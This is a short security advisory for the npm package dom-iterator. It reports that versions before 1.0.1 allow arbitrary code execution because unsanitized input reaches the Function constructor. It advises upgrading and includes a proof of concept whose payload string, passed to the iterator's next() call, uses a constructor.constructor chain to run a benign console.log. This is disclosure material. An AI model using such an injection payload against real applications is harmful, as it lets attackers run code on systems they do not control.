## How to fix?

Upgrade `dom-iterator` to version 1.0.1 or higher.

## Overview

[dom-iterator](https://www.npmjs.com/package/dom-iterator) is a feature-rich, well-tested Iterator for traversing DOM nodes.

Affected versions of this package are vulnerable to Arbitrary Code Execution due to use of the `Function` constructor without complete input sanitization. `Function` generates a new function body and thus care must be given to ensure that the inputs to Function are not attacker-controlled. The risks involved are similar to that of allowing attacker-controlled input to reach `eval`.

## PoC

Executing this code will cause the code `console.log("GLOBAL.CTF HIT")` to be executed, leading to the output of the string `'GLOBAL.CTF HIT'` to the console.

```
var PUT = require('dom-iterator');
global.CTF = function() { console.log("GLOBAL.CTF HIT") } // We want to prove we can execute this by using the package

var parser = require('mini-html-parser');
var html = '<h1></h1>'; // Any non-empty html should work
var parser = parser(html);
var node = parser.parse();

var it = PUT(node);
var next;
while (next = it.next("constructor.constructor('global.CTF()')()")) { }

```
